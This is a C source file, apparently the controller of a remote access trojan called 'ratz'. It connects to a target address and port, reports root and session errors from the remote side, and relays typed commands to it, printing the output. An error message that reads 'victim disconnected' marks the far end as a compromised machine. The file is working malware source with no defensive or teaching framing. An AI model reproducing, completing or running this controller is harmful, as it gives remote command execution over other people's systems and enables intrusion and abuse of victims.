/***************************************************************************************/
/*       ,--,                                                                          */
/*    ,---.'|                                                                          */
/*    |   | :                        ,-.----.                  ___                     */
/*    :   : |                        \    /  \               ,--.'|_                   */
/*    |   ' :                        ;   :    \              |  | :,'        ,----,    */
/*    ;   ; '              .--.--.   |   | .\ :              :  : ' :      .'   .`|    */
/*    '   | |__   ,---.   /  /    '  .   : |: |   ,--.--.  .;__,'  /    .'   .'  .'    */
/*    |   | :.'| /     \ |  :  /`./  |   |  \ :  /       \ |  |   |   ,---, '   ./     */
/*    '   :    ;/    /  ||  :  ;_    |   : .  / .--.  .-. |:__,'| :   ;   | .'  /      */
/*    |   |  ./.    ' / | \  \    `. ;   | |  \  \__\/: . .  '  : |__ `---' /  ;--,    */
/*    ;   : ;  '   ;   /|  `----.   \|   | ;\  \ ," .--.; |  |  | '.'|  /  /  / .`|    */
/*    |   ,/   '   |  / | /  /`--'  /:   ' | \.'/  /  ,.  |  ;  :    ;./__;     .'     */
/*    '---'    |   :    |'--'.     / :   : :-' ;  :   .'   \ |  ,   / ;   |  .'        */
/*              \   \  /   `--'---'  |   |.'   |  ,     .-./  ---`-'  `---'            */
/*               `----'              `---'      `--`---'                               */
/***************************************************************************************/

# include "ratz.h"
# include "master.h"

void	connect_to_server(s_ratz* ratz)
{
	if ((ratz->server = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		strexit("socket", 1);
	ratz_set_addri(&ratz->addri, AF_INET, ratz->addr, ratz->raw_port);
	if (connect(ratz->server, (const s_sockaddr*)&ratz->addri, sizeof(ratz->addri)) == -1)
		strexit("connect", 1);
}

void	sig_handler(int signum)
{
	if (signum == SIGINT)
	{
		rl_on_new_line();
		rl_redisplay();
		write(STDOUT_FILENO, "\n", 1);
		write(STDOUT_FILENO, RATZ_PROMPT, strlen(RATZ_PROMPT));
	}
}

void	recv_auth_error(s_red red)
{
	char	auth_er[13] = {0};

	read(red.ratz.server, auth_er, 11);
	read(red.ratz.server, &auth_er[11], 2);
	if (strstr(auth_er, RATZ_STRSTR_PR))
		write(2, RATZ_TRY_ROOT_ER, strlen(RATZ_TRY_ROOT_ER));
	if (strstr(auth_er, RATZ_STRSTR_GR))
		write(2, RATZ_TRY_GROOT_ER, strlen(RATZ_TRY_GROOT_ER));
	if (strstr(auth_er, RATZ_STRSTR_SID))
		write(2, RATZ_SETSID_ER, strlen(RATZ_SETSID_ER));
	if (strstr(auth_er, RATZ_STRSTR_CTL))
		write(2, RATZ_IOCTL_ER, strlen(RATZ_IOCTL_ER));
}

static inline
void	exit_interpret(s_red* red)
{
	printf("exit\n");
	write(red->ratz.server, "exit\n", 6);
	red->killed = 1;
}

#include <poll.h>
int	main(int unused, char** av)
{
	(void)unused;
	signal(SIGINT, sig_handler);
	s_red	red;
	memset(&red, 0, sizeof(red));

	if (!av[1])
		strexit("pass address IP", 1);
	red.ratz.addr = av[1];
	red.ratz.raw_port = ratz__get_port_method(av[2]);
	connect_to_server(&red.ratz);
	char	output[DEBUG_SIZE_MAX] = {0};
	int		n = 0;
	fcntl(red.ratz.server, F_SETFL, ~O_NONBLOCK);
	recv_auth_error(red);
	fcntl(red.ratz.server, F_SETFL, fcntl(red.ratz.server, F_GETFL) | O_NONBLOCK);

	//struct pollfd pfd;
	//pfd.fd = red.ratz.server;
	//pfd.events = POLLIN;
	//pfd.revents = 0;

	while (red.killed == 0)
	{
		red.buffer = readline(RATZ_PROMPT);
		if (!red.buffer)
			exit_interpret(&red);
		else if (red.buffer[0])
		{
			if (!strcmp(red.buffer, "exit"))
				exit_interpret(&red);
			else if (strcmp(red.buffer, "\003"))
			{
				if (write(red.ratz.server, red.buffer, strlen(red.buffer)) <= 0)
					strexit("victim disconnected", 0);
				fcntl(red.ratz.server, F_SETFL, fcntl(red.ratz.server, F_GETFL) & ~O_NONBLOCK);
				fcntl(STDIN_FILENO, F_SETFL, O_NONBLOCK);
				memset(output, 0, sizeof(output));
				while (1)
				{
					sleep(1);
					//poll(&pfd, 1, 100);
					//printf("q\n");
					fcntl(red.ratz.server, F_SETFL, O_NONBLOCK);
					n = recv(red.ratz.server, output, sizeof(output), 0);
					if (n > 0)
					{
						if (strstr(output, "\0033EONING\003"))
						{
							if (n > 10) // strlen("\0033EONING\003")
								write(STDOUT_FILENO, output, n - 10); // strlen("\0033EONING\003")
							write(STDOUT_FILENO, "EONING\n", 8);
							break;
						}
						else
							write(STDOUT_FILENO, output, n);
					}
					//poll(&pfd, 1, 0);
					n = 0;
					//if (pfd.revents & POLLIN)
					//{
					//	printf("stdin\n");
					//	while ((n = read(STDIN_FILENO, output, DEBUG_SIZE_MAX)) <= 0)	// readall jusqu'a '\n' ou '\003' (eof)
					//		;
					//}
					n = read(STDIN_FILENO, output, DEBUG_SIZE_MAX);
					//printf("n : %d\n", n);
					fcntl(red.ratz.server, F_SETFL, ~O_NONBLOCK);
					if (n > 0)
						send(red.ratz.server, output, n - 1, 0);
				}
				printf("sortie\n");
				fcntl(red.ratz.server, F_SETFL, fcntl(red.ratz.server, F_GETFL) & ~O_NONBLOCK);
				free(red.buffer);
			}
		}
	}
	close(red.ratz.server);
	return (0);
}
